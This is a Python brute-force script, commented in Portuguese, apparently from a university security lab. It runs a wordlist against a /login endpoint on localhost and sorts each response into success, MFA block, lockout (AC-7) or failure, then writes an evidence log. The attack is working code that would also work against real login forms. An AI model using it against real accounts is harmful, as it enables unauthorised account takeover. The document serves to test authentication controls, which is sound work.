"""
Brute force de senha contra o endpoint /login de UMA das apps deste projeto.

USO EXCLUSIVO no laboratorio local deste trabalho (apps em localhost).

  python brute_force.py --url http://localhost:5000 --usuario alvo \
      --wordlist wordlist.txt --saida ../evidencias/ataque_vuln_bruteforce.txt

Classifica cada tentativa pelo corpo da resposta (sinais observaveis):
  - "bem-vindo"   -> COMPROMETIMENTO TOTAL (sessao obtida)
  - "duas etapas" -> senha correta, mas MFA barrou (comprometimento parcial)
  - "bloquead"    -> lockout acionado (AC-7)
  - caso contrario -> tentativa falha
"""
import argparse
import sys
import time

import requests


def classificar(texto: str) -> str:
    t = texto.lower()
    if "bem-vindo" in t:
        return "SUCESSO_TOTAL"
    if "duas etapas" in t:
        return "SENHA_OK_MFA_BARROU"
    if "bloquead" in t:
        return "BLOQUEADO"
    return "FALHA"


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True, help="ex.: http://localhost:5000")
    p.add_argument("--usuario", required=True)
    p.add_argument("--wordlist", required=True)
    p.add_argument("--saida", default=None, help="arquivo de evidencia")
    args = p.parse_args()

    with open(args.wordlist, encoding="utf-8") as f:
        senhas = [l.strip() for l in f if l.strip()]

    linhas = []

    def log(msg):
        print(msg)
        linhas.append(msg)

    log("=" * 64)
    log(f"ATAQUE DE FORCA BRUTA")
    log(f"Alvo        : {args.url}/login")
    log(f"Usuario     : {args.usuario}")
    log(f"Senhas testar: {len(senhas)}")
    log(f"Inicio      : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log("=" * 64)

    inicio = time.time()
    resultado_final = "NENHUM_SUCESSO"
    tentativas = 0

    for i, senha in enumerate(senhas, 1):
        sessao = requests.Session()
        try:
            r = sessao.post(f"{args.url}/login",
                            data={"usuario": args.usuario, "senha": senha},
                            timeout=10, allow_redirects=True)
        except requests.RequestException as e:
            log(f"[{i:02d}] ERRO de conexao: {e}")
            break

        tentativas += 1
        estado = classificar(r.text)
        log(f"[{i:02d}] senha='{senha}' -> {estado}")

        if estado == "SUCESSO_TOTAL":
            resultado_final = f"COMPROMETIDO com a senha '{senha}'"
            break
        if estado == "SENHA_OK_MFA_BARROU":
            resultado_final = (f"Senha '{senha}' estava correta, mas o MFA "
                               f"impediu o acesso (IA-2(1)).")
            break
        if estado == "BLOQUEADO":
            resultado_final = (f"Conta BLOQUEADA apos {tentativas} tentativas "
                               f"(AC-7). Ataque interrompido.")
            break

    dur = time.time() - inicio
    log("=" * 64)
    log(f"RESULTADO   : {resultado_final}")
    log(f"Tentativas  : {tentativas}")
    log(f"Duracao     : {dur:.2f}s")
    log("=" * 64)

    if args.saida:
        with open(args.saida, "w", encoding="utf-8") as f:
            f.write("\n".join(linhas) + "\n")
        print(f"\n[evidencia salva em {args.saida}]")

    return 0


if __name__ == "__main__":
    sys.exit(main())
